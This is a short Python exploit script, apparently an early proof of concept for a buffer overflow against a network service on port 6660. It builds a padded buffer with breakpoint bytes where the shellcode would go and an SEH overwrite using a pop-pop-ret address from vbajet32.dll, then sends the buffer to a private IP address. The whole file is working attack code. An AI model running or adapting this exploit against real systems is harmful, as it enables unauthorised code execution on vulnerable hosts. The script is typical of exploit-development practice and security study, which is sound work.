#!/usr/bin/python
import socket

target_address="192.168.100.118"
target_port=6660

buffer = "USV "
buffer+= "\x90" * 962
buffer+= "\xcc\xcc\xcc\xcc"
buffer+= "\x9f\xa1\x11\x1b" # SEH Overwrite - pop-pop-ret from vbajet32.dll 0x1b11a19f
buffer+= "\x90" * (2504 - len(buffer))
buffer+= "\r\n\r\n"

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(buffer)
sock.close()

